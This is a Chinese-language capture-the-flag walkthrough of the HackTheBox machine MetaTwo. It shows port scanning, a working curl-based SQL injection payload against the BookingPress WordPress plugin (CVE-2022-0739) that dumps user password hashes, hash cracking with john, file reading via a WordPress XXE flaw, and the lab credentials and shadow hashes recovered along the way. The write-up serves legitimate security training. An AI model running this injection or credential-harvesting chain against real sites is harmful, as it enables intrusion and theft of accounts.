---
title: MetaTwo - HackTheBox
url: https://darkwing.moe/2022/11/01/MetaTwo-HackTheBox/
source: 喵喵喵喵
date: 2022-11-02
fetch_date: 2025-10-03T21:30:13.567577
---

# MetaTwo - HackTheBox

[![](/img/avatar.jpg)](/)

##### 暗羽

Discord@darkwing\_nya

* [主页](/)
* [Archives](/archives)
* [Tags](/tags)
* [Categories](/categories)
* [Github](https://github.com/zjicmDarkWing)
* [Twitter](https://twitter.com/darkwing_nya)
* [Buy me a coffee](https://www.buymeacoffee.com/darkwing_nya)
* [About](https://darkwing.moe/2015/01/01/about/)

MetaTwo - HackTheBox

# MetaTwo - HackTheBox

##### 2022-11-01

#### TOC

1. [1. 基本信息](#基本信息)
   1. [1.1. 10.10.11.186](#10-10-11-186)
2. [2. 端口扫描](#端口扫描)
   1. [2.1. 80](#80)
3. [3. CVE-2022-0739](#CVE-2022-0739)
   1. [3.1. hash crack](#hash-crack)
4. [4. wordpress](#wordpress)
   1. [4.1. XXE](#XXE)
5. [5. FTP](#FTP)
6. [6. user flag](#user-flag)
7. [7. 提权信息](#提权信息)
8. [8. 提权 & root flag](#提权-amp-root-flag)
   1. [8.1. shadow](#shadow)
9. [9. 参考资料](#参考资料)

# MetaTwo - HackTheBox

2022-11-01

# 基本信息

* <https://www.hackthebox.com/home/machines/profile/504>
* ## 10.10.11.186

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022110101.jpg)

# 端口扫描

21,22,80:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 ``` | ``` $ nmap -sC -sV -Pn 10.10.11.186 Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-01 13:03 CST Nmap scan report for 10.10.11.186 Host is up (0.19s latency). Not shown: 992 closed tcp ports (conn-refused) PORT      STATE    SERVICE    VERSION 21/tcp    open     ftp? | fingerprint-strings: |   GenericLines: |     220 ProFTPD Server (Debian) [::ffff:10.10.11.186] |     Invalid command: try being more creative |_    Invalid command: try being more creative 22/tcp    open     ssh        OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: |   3072 c4b44617d2102d8fec1dc927fecd79ee (RSA) |   256 2aea2fcb23e8c529409cab866dcd4411 (ECDSA) |_  256 fd78c0b0e22016fa050debd83f12a4ab (ED25519) 80/tcp    open     http       nginx 1.18.0 |_http-title: Did not follow redirect to http://metapress.htb/ |_http-server-header: nginx/1.18.0 1524/tcp  filtered ingreslock 2106/tcp  filtered ekshell 2179/tcp  filtered vmrdp 8192/tcp  filtered sophos 60443/tcp filtered unknown 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port21-TCP:V=7.93%I=7%D=11/1%Time=6360A8F9%P=x86_64-apple-darwin21.5.0% SF:r(GenericLines,8F,"220\x20ProFTPD\x20Server\x20\(Debian\)\x20\[::ffff:1 SF:0\.10\.11\.186\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\ SF:x20creative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20cr SF:eative\r\n"); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 262.94 seconds ``` |

## 80

需要加hosts

|  |  |
| --- | --- |
| ``` 1 ``` | ``` 10.10.11.186 metapress.htb ``` |

一个wordpress：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022110102.jpg)

查看events，源码中可以知道使用了booking press 1.0.10插件：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022110103.jpg)

# CVE-2022-0739

插件sql注入：

* BookingPress < 1.0.11 - Unauthenticated SQL Injection WordPress Security Vulnerability
  <https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357>

要利用这个漏洞，首先需要再events页面源码中获取wpnonce:

|  |  |
| --- | --- |
| ``` 1 ``` | ``` var postData = { action:'bookingpress_generate_spam_captcha', _wpnonce:'a3e32ad14e' }; ``` |

然后就是一步步sql注入获取数据，可以手动，也可以sqlmap：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 ``` | ``` curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=a3e32ad14e&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'  curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=a3e32ad14e&category_id=33&total_service=-7502) UNION ALL SELECT group_concat(user_login),group_concat(user_pass),@@version_compile_os,1,2,3,4,5,6 from wp_users-- -'  admin admin@metapress.htb $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. manager manager@metapress.htb $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 ``` |

## hash crack

可以破解出来manager的密码：

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt  partylikearockstar ``` |

# wordpress

得到的账号密码登录wordpress，知道版本是5.6.2，可以搜到相关漏洞：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022110104.jpg)

* WordPress 5.6-5.7 - Authenticated XXE Within the Media Library Affecting PHP 8 WordPress Security Vulnerability
  <https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5>
* motikan2010/CVE-2021-29447: WordPress - Authenticated XXE (CVE-2021-29447)
  <https://github.com/motikan2010/CVE-2021-29447>

## XXE

利用这个漏洞读文件，从nginx配置文件中得到wordpress路径，然后去读config，在config中得到FTP账号密码：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 ``` | ``` /etc/nginx/sites-enabled/default /var/www/metapress.htb/blog/wp-config.php  define( 'DB_NAME', 'blog' ); /** MySQL database username */ define( 'DB_USER', 'blog' ); /** MySQL database password */ define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );  define( 'FS_METHOD', 'ftpext' ); define( 'FTP_USER', 'metapress.htb' ); define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' ); define( 'FTP_HOST', 'ftp.metapress.htb' ); define( 'FTP_BASE', 'blog/' ); define( 'FTP_SSL', false );  define( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n>+3m?.B/:' ); define( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' ); define( 'LOGGED_IN_KEY',    'J+mxCaP4z<g.6P^t`ziv>dd}EEi%48%JnRq^2MjFiitn#&n+HXv]||E+F~C{qKXy' ); define( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' ); define( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*<~:0]s}d<&M;.,x0z~R>3!D' ); define( 'SECURE_AUTH_SALT', '>`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&~omiH^jVC?2-I?I.' ); define( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&^JsI`M)FJTJEVI) N#NOidIf=' ); define( 'NONCE_SALT',       '.sU&CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' ); ``` |

# FTP

得到的账号密码登录FTP，在send\_email.php中得到jnelson密码：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 ``` | ``` $mail->Host = "mail.metapress.htb"; $mail->SMTPAuth = true; $mail->Username = "jnelson@metapress.htb"; $mail->Password = "Cb4_JmWM8zUZWMu@Ys"; $mail->SMTPSecure = "tls"; $mail->Port = 587; ``` |

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022110105.jpg)

# user flag

jnelson ssh登录：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022110106.jpg)

# 提权信息

当前用户目录下有个.passpie目录，搜索资料可以知道这是个密码管理器

* marcwebbie/passpie: Multiplatform command-line password manager
  <https://github.com/marcwebbie/passpie>

查看其中文件可以发现加密的pgp key和root pass：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022110107.jpg)

# 提权 & root flag

首先破解出来pgp key的密码,然后导出密码，得到root ssh密码

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 ``` | ``` gpg2john pgp_key > hash.txt sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt  blink182  passpie export pass  credentials: - comment: ''   fullname: root@ssh   login: root   modified: 2022-06-26 08:58:15.621572   name: ssh   password: !!python/unicode 'p7qfAZt4_A1xo_0x' - comment: ''   fullname: jnelson@ssh   login: jnelson   modified: 2022-06-26 08:58:15.514422   name: ssh   password: !!python/unicode 'Cb4_JmWM8zUZWMu@Ys' handler: passpie version: 1.0 ``` |

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022110108.jpg)

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022110109.jpg)

## shadow

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` root:$y$j9T$dnzdMw6.gAkYBbVw1pRaz.$2laiSFO34jFWk9/r6kkJo2tArgYO8AGv2v0FkUPwlr2:19270:0:99999:7::: jnelson:$y$j9T$EJLWL6/.ymr3lhpWK6Qda.$lDuRPBwlc...